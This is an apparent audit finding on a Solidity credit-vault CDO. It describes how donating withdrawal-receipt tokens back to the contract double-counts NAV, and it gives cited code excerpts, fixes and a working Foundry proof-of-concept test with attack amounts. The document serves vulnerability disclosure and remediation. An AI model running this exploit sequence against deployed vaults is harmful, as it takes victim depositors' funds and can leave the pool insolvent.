### Title
Withdrawal-receipt donations create a double-counted NAV and under-collateralized tranche claims - ([contracts/IdleCDOEpochVariant.sol](contracts/IdleCDOEpochVariant.sol))

### Summary
An unprivileged, wallet-allowed lender can inflate a nearly empty tranche by requesting a withdrawal, transferring the freely transferable `IdleCreditVault` receipt tokens back to the CDO, and leaving the corresponding `pendingWithdraws` obligation outstanding. The CDO counts every strategy token held by the contract as managed NAV, while `_skimDonatedAssets` removes only raw underlying tokens and leaves donated strategy-token receipts in NAV. [1](#0-0) [2](#0-1) 

### Finding Description
`requestWithdraw` burns tranche shares and calls `IdleCreditVault.requestWithdraw`, which burns the CDO’s strategy-token principal but mints an equal receipt token to the requester while retaining a separate `pendingWithdraws` claim. [3](#0-2) [4](#0-3) 

Because the receipt is an ordinary ERC20 token, the requester can donate it back to the CDO instead of retaining it for redemption. [5](#0-4) [6](#0-5) 

The donated receipt then has two conflicting representations: it increases CDO NAV through `_contractTokenBalance(strategyToken)`, while its original user-level withdrawal basis remains recorded in `withdrawsRequests` and `pendingWithdraws`. [1](#0-0) [7](#0-6) 

An attacker can open with a dust-sized residual tranche position, donate a much larger receipt, and cause a victim’s deposit to be minted against the inflated saved price through `_mintSharesAtCurrPrice`. [8](#0-7) [9](#0-8) 

Unlike a direct underlying donation, this receipt is not removed by `_skimDonatedAssets`, because that function transfers only `token` and not `strategyToken`. [2](#0-1) 

### Impact Explanation
For a USDC-denominated vault, an attacker can deposit `100_000_001` units, withdraw `100_000_000` units into a receipt while retaining shares backed by one unit, and donate the receipt to the CDO. [4](#0-3) 

If the victim then deposits `199_000_000` units, share rounding mints only one dust-sized tranche unit to the victim while NAV increases by the full deposit, allowing the attacker’s residual share to claim approximately half of the inflated NAV after subsequent accounting. [8](#0-7) [10](#0-9) 

A subsequent attacker withdrawal burns the donated receipt as CDO strategy-token backing and creates a second withdrawal obligation, while the original donated request remains pending because its receipt is no longer held by the requester. [4](#0-3) [6](#0-5) 

The result is aggregate claims exceeding borrower principal: in the illustrative amounts, approximately `399_000_000` units of pending and active claims are backed by only `299_000_001` units sent to the borrower. [11](#0-10) [12](#0-11) 

This can cause direct depositor loss, permanent locked withdrawal liquidity, or an insolvent epoch stop when the honest borrower cannot fund the duplicated pending obligation. [13](#0-12) [14](#0-13) 

### Likelihood Explanation
The attack requires only a KYC-passing lender, an underlying donation-sized amount of temporary capital, and no privileged action. [15](#0-14) 

The attacker does not need malicious borrower behavior, oracle manipulation, or a privileged pause; all actions use ordinary deposits, withdrawal requests, and ERC20 transfers. [16](#0-15) [17](#0-16) 

The existing donation guard does not stop it because it ignores strategy-token balances, and there is no reconciliation between receipt token custody and the user keyed withdrawal-request mappings. [2](#0-1) [18](#0-17) 

### Recommendation
Track withdrawal-receipt tokens separately from active CDO strategy-token principal, or prevent `IdleCreditVault` receipt tokens from being transferred to the CDO. [19](#0-18) [4](#0-3) 

`_managedContractValue` and `getContractValue` should subtract strategy-token balances that correspond to outstanding `pendingWithdraws`, `pendingInstantWithdraws`, or other receipt liabilities rather than treating every token held by the CDO as free NAV. [19](#0-18) 

Alternatively, make withdrawal receipts non-transferable or bind claimability to receipt custody so surrendering the receipt also clears its corresponding user-level pending basis. [20](#0-19) 

A minimum-share or dead-share initialization would reduce the dust-position component, but it would not remove the fundamental double counting and therefore should not be the sole fix. [21](#0-20) 

### Proof of Concept
The following Foundry-style test uses the existing `test/foundry/IdleCreditVault.t.sol` deployment variables and assumes a six-decimal underlying, an eighteen-decimal tranche token, zero performance fee, and the factory minimum `500` management-fee rate. [22](#0-21) [23](#0-22) 

```solidity
// test/foundry/IdleCreditVault.t.sol
function testWithdrawReceiptDonationDoubleCountsNAV() external {
    uint256 donation = 100_000_000;      // 100 USDC
    uint256 dust = 1;
    uint256 victimAmount = 199_000_000; // 199 USDC
    uint256 trancheScale = 10 ** (18 - underlying.decimals());

    // Keep the test deterministic: no epoch interest and only the
    // minimum management fee is used to force an accounting repricing.
    vm.startPrank(cdoEpoch.owner());
    cdoEpoch.setFeeParams(cdoEpoch.feeReceiver(), 0, 0, 500);
    vm.stopPrank();
    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(0, 0);

    address attacker = makeAddr("receiptDonor");
    address victim = makeAddr("victim");

    // Attacker deposits D + 1 and withdraws D, leaving only dust-backed
    // tranche shares and receiving D strategy-token withdrawal receipts.
    deal(defaultUnderlying, attacker, donation + dust);
    vm.startPrank(attacker);
    underlying.approve(address(cdoEpoch), donation + dust);
    cdoEpoch.depositAA(donation + dust);

    uint256 donationShares = donation * trancheScale;
    cdoEpoch.requestWithdraw(donationShares, address(AAtranche));

    // The receipt is unrestricted ERC20. Donating it leaves the original
    // pending request alive while adding the token back to CDO NAV.
    IERC20(address(strategy)).transfer(address(cdoEpoch), donation);
    vm.stopPrank();

    assertEq(
        IERC20(address(strategy)).balanceOf(address(cdoEpoch)),
        donation + dust,
        "donated receipt is counted as strategy-token NAV"
    );

    // Victim deposits slightly below twice the donation and receives only
    // one dust-sized tranche unit because of division rounding.
    deal(defaultUnderlying, victim, victimAmount);
    vm.startPrank(victim);
    underlying.approve(address(cdoEpoch), victimAmount);
    uint256 victimShares = cdoEpoch.depositAA(victimAmount);
    vm.stopPrank();

    uint256 attackerShares = AAtranche.balanceOf(attacker);
    assertEq(victimShares, attackerShares, "victim mint rounded down to attacker share count");
    assertGt(cdoEpoch.lastNAVAA(), donation + victimAmount);

    // Accrue a small management fee so forced NAV-per-share repricing occurs,
    // then convert the attacker's inflated share into a second withdrawal request.
    vm.warp(block.timestamp + 1 days);
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(attackerShares, address(AAtranche));

    uint256 secondRequest = IERC20(address(strategy)).balanceOf(attacker);
    assertGt(secondRequest, donation * 14 / 10, "inflated share did not extract expected value");

    // The original request is still pending even though its receipt was
    // donated and then burned as CDO strategy-token backing.
    uint256 pending = IdleCreditVault(address(strategy)).pendingWithdraws();
    assertEq(pending, donation + secondRequest, "same receipt backing creates two pending claims");

    // The victim still holds active NAV. Aggregate claims therefore exceed
    // the actual cash principal that can be sent to the honest borrower.
    uint256 victimClaimBasis = victimShares *
        cdoEpoch.virtualPrice(address(AAtranche)) /
        ONE_TRANCHE_TOKEN;
    uint256 aggregateClaims = pending + victimClaimBasis;
    uint256 realPrincipal = donation + dust + victimAmount;

    assertGt(aggregateClaims, realPrincipal + 99_000_000, "claims exceed actual principal");
}
```

The important reproducible state transition is `pendingWithdraws = originalReceipt + attackerSecondRequest`, while `IdleCreditVault` has already burned CDO-held receipt backing for the second request. [4](#0-3) 

If the victim also requests withdrawal before `startEpoch`, the strategy is asked to fund approximately `399_000_000` units of pending receipts from only `299_000_001` units of borrower principal, producing an approximately `99_000_000`-unit shortfall under zero-APR conditions. [11](#0-10) [12](#0-11)

### Citations

**File:** contracts/IdleCDOCreditVault.sol (L95-109)
```text
  /// @notice pausable
  /// @dev msg.sender should approve this contract first to spend `_amount` of `token`
  /// @param _amount amount of `token` to deposit
  /// @return AA tranche tokens minted
  function depositAA(uint256 _amount) external returns (uint256) {
    return _deposit(_amount, AATranche);
  }

  /// @notice pausable in _deposit
  /// @dev msg.sender should approve this contract first to spend `_amount` of `token`
  /// @param _amount amount of `token` to deposit
  /// @return BB tranche tokens minted
  function depositBB(uint256 _amount) external returns (uint256) {
    _checkNotAuthorized(!isBBDepositEnabled);
    return _deposit(_amount, BBTranche);
```

**File:** contracts/IdleCDOCreditVault.sol (L125-137)
```text
  function getContractValue() public override view returns (uint256) {
    // Credit vault strategy tokens are minted 1:1 with underlyings and use the same decimals.
    return _contractTokenBalance(strategyToken) + _contractTokenBalance(token) - unclaimedFees;
  }

  /// @notice Calculates the current managed net TVL.
  /// @dev Raw underlyings held by the CDO are excluded because unsolicited transfers are skimmed on interactions.
  /// @return Strategy-token-backed TVL net of accrued fees.
  function _managedContractValue() internal virtual view returns (uint256) {
    uint256 strategyTokenBalance = _contractTokenBalance(strategyToken);
    uint256 fees = unclaimedFees;
    return strategyTokenBalance > fees ? strategyTokenBalance - fees : 0;
  }
```

**File:** contracts/IdleCDOCreditVault.sol (L344-362)
```text
  function _mintSharesAtCurrPrice(uint256 _amount, address _to, address _tranche) internal virtual returns (uint256 _minted) {
    // calculate # of tranche token to mint based on current tranche price: _amount / tranchePrice
    _minted = _amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche);
    _mintShares(_tranche, _to, _minted, _amount);
  }

  /// @notice mint tranche tokens and updates tranche last NAV
  /// @param _tranche tranche address
  /// @param _to receiver address of the newly minted tranche tokens
  /// @param _shares number of tranche tokens to mint
  /// @param _underlyings amount of underlyings added to the tranche
  function _mintShares(address _tranche, address _to, uint256 _shares, uint256 _underlyings) internal {
    IdleCDOTranche(_tranche).mint(_to, _shares);
    // update NAV with the _amount of underlyings added
    if (_tranche == AATranche) {
      lastNAVAA += _underlyings;
    } else {
      lastNAVBB += _underlyings;
    }
```

**File:** contracts/IdleCDOCreditVault.sol (L428-436)
```text

  /// @notice internal method used to deploy a new tranche token
  /// @param _namePrefix prefix for the name of the tranche token
  /// @param _symbolPrefix prefix for the symbol of the tranche token
  /// @param _symbol suffix for the symbol of the tranche token
  /// @return address of the newly deployed tranche token
  function _deployTranche(string memory _namePrefix, string memory _symbolPrefix, string memory _symbol) internal returns (address) {
    return address(new IdleCDOTranche(_concat(_namePrefix, _symbol), _concat(_symbolPrefix, _symbol)));
  }
```

**File:** contracts/IdleCDOCreditVault.sol (L550-560)
```text
  /// @notice Checkpoint accrued management fees into `unclaimedFees`.
  /// @dev Raw underlyings are excluded because unsolicited transfers are skimmed instead of managed.
  function _accrueManagementFee() internal {
    unclaimedFees += _calculateManagementFee(_managedContractValue(), block.timestamp - latestHarvestBlock);
    latestHarvestBlock = block.timestamp;
  }

  /// @notice calculate annualized management fee for a balance over a duration
  function _calculateManagementFee(uint256 _nav, uint256 _duration) internal view returns (uint256) {
    // 3153600000000 == FULL_ALLOC * 365 days
    return _nav * managementFee * _duration / 3153600000000;
```

**File:** contracts/IdleCDOEpochVariant.sol (L270-295)
```text
    // transfer in this contract funds from interest payment (if any) and buffer deposits sent to the strategy
    uint256 _totEpochDeposits = _strategy.totEpochDeposits();
    // If interest is minted we do not transfer interest to the strategy
    uint256 _toSend = isInterestMinted ? _totEpochDeposits : lastEpochInterest + _totEpochDeposits;
    _strategy.sendInterestAndDeposits(_toSend);

    // we should first check if there are *instant* redeem requests pending 
    // and if yes we should send as much underlyings as possible to the IdleCreditVault contract
    // if there is any surplus then we send those to the borrower
    uint256 pendingInstant = _pendingInstant();
    uint256 totUnderlyings = _contractTokenBalance(token);
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
    _strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);

    // if there are more requests than the current underlyings we simply send all underlyings
    // to the IdleCreditVault contract
    if (pendingInstant > totUnderlyings) {
      // if borrower is programmable, notify epoch start even if no funds were sent
      _startEpochProgrammableBorrower(_pendingWithdraws);
      return;
    }
    // allow instant withdraws right away without waiting for the deadline
    allowInstantWithdraw = true;
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
```

**File:** contracts/IdleCDOEpochVariant.sol (L405-410)
```text

    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
```

**File:** contracts/IdleCDOEpochVariant.sol (L496-505)
```text
      if (_lossAmount != 0) {
        _strategy.burnStrategyTokens(_lossAmount);
        // Realize the active loss immediately through the ordinary BB-first waterfall.
        _forceUpdateAccounting();
      }
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L739-756)
```text
  function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256 _underlyings) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    // we trigger an update accounting to check for eventual losses
    _updateAccounting();

    IdleCreditVault creditVault = IdleCreditVault(strategy);
    if (_amount == 0) {
      _amount = _userTrancheBal(msg.sender, _tranche);
    }
    _underlyings = _trancheToUnderlyings(_amount, _tranche);
```

**File:** contracts/IdleCDOEpochVariant.sol (L772-790)
```text
    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
    // burn tranche tokens and decrease NAV without interest for the next epoch as it was not yet counted in NAV
    _withdrawOps(_amount, principal, _tranche);
```

**File:** contracts/IdleCDOEpochVariant.sol (L793-796)
```text
  /// @notice Transfer donated assets to the feeReceiver
  function _skimDonatedAssets() internal {
    _transferUnderlyings(feeReceiver, _contractTokenBalance(token));
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L29-35)
```text
contract IdleCreditVault is
  Initializable,
  OwnableUpgradeable,
  ERC20Upgradeable,
  ReentrancyGuardUpgradeable,
  IIdleCDOStrategy
{
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L272-280)
```text
    // burn strategy tokens from cdo (we don't burn future interest here, only the principal)
    _burn(msg.sender, _principal);
    // mint equal amount of strategy tokens to the user as receipt (interest included), useful in case of default
    _mint(_user, _amount);
    // A successfully closed pool already recalled all funds and has no later stopEpoch.
    if (!isClosed) {
      // Global amount that stopEpoch must source from borrower/strategy for all pending receipts.
      pendingWithdraws += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L281-294)
```text
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L338-349)
```text
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L405-429)
```text
  /// @notice collect borrower-funded withdraw receipt funds
  /// @dev Only IdleCDO can call this function. When `_amount` is lower than the
  /// pending basis, the difference is a stopEpochWithDuration loss assigned to
  /// pending receipts and users later claim through `lossRecoveryPriceByEpoch`.
  /// Reverts if the resulting recovery price rounds to zero at `RECOVERY_FULL` precision.
  /// @param _amount number of funded tokens to collect
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
```

**File:** contracts/IdleCreditVaultFactory.sol (L16-19)
```text
  uint256 public constant FULL_ALLOC = 100_000;
  uint256 public constant DEFAULT_FEE_SPLIT = 50_000;
  uint256 public constant MIN_PERFORMANCE_FEE = 5_000;
  uint256 public constant MIN_MANAGEMENT_FEE = 500;
```
